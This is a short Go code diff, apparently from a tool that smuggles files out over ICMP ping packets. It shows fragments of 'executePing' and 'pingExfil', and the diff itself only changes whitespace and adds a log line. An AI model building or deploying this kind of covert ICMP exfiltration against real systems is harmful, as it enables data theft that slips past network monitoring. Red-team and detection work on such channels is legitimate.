@@ -11,7 +11,7 @@ import (
 
 
 )
-// executePing is a basic ping implementation 
+// executePing is a basic ping implementation
 func executePing(targetIP string, fileBytes []byte) {
 	c, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
     check(err)
@@ -33,6 +33,7 @@ func executePing(targetIP string, fileBytes []byte) {
 
 // pingExfil Sends a file over ping to a destination server
 func pingExfil(destination, fileName string) {
-	fileAsHex := hexEncode(fileName)
+    fileAsHex := hexEncode(fileName)
+    log.Println(fileAsHex)
 	executePing(destination, fileAsHex)
 }
